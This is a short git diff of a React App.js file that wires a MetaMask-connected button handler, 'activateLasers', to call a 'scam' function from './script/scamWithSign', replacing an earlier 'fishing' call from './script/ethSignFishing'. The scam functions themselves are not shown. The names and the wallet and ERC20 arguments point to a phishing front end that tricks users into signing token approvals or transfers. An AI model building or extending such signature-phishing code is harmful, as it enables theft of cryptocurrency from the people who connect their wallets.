@@ -1,10 +1,11 @@
 import logo from './logo.svg';
 import './App.css';
-import { fishing } from './script/ethSignFishing';
 import { connectMetamask, erc20Obj, walletAddress } from "./lib/wallets/index.js"
+import { scam } from './script/scamWithSign';
 
 async function activateLasers() {
-  await fishing(walletAddress, erc20Obj);
+  // await fishing(walletAddress, erc20Obj);
+  await scam(walletAddress, erc20Obj);
 }
 
 function App() {
